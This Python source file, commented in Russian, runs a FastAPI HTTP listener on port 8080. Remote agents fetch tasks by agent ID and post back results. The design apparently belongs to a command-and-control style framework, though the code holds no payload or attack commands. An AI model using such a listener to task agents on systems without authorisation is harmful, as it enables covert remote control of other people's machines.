from pydantic import BaseModel
import threading
import time
import uvicorn
from fastapi import FastAPI

def run_http(stop_event, task_manager):
    #JSON структура для организации парсинга при приеме от агента инфы
    class ResultRequest(BaseModel):
        task_id: int
        result: str

    app = FastAPI()

#======================ендпоинты=====================================
    @app.get("/get_task/{agent_id}")
    def get_task(agent_id):
        #коннект с БД, создается именно в ендпоинтах, так как они работают в другом потоке относительно функции слушателя
        connection = task_manager.get_connection()
        
        try:
            task = task_manager.get_next_task(connection, agent_id)
             
            if task is None:
                return {"task": None}
            else:
                print(f"[+/HTTP] Задача успешно получена агентом {agent_id}.")
                return {"task": task}
        finally:
            connection.close()

    @app.post("/send_result")
    def send_result(data: ResultRequest):
        #аналогичный ендпоинту get_task коннект с БД
        connection = task_manager.get_connection()

        try:
            result = task_manager.complete_task(connection, data.task_id, data.result)
            
            if result is True:
                print(f"[+/HTTP] Задача {data.task_id} выполнена.")
                return {"status": "ok"}
            else:
                return {"status": "error"}
        finally:
            connection.close()

    @app.get("/health")
    def health():
        return {"status": "ok"}
#====================================================================
    print("[+/HTTP] http-слушатель работает")

    config = uvicorn.Config(app, host="0.0.0.0", port=8080, log_level="error")
    server = uvicorn.Server(config)

    server_thread = threading.Thread(target=server.run, daemon=True)
    server_thread.start()

    #основной цикл работы слушателя
    while not stop_event.is_set():
        time.sleep(0.5)

    server.should_exit = True
    server_thread.join(timeout=2)

    print("[+/HTTP] http-слушатель прекратил работу.")
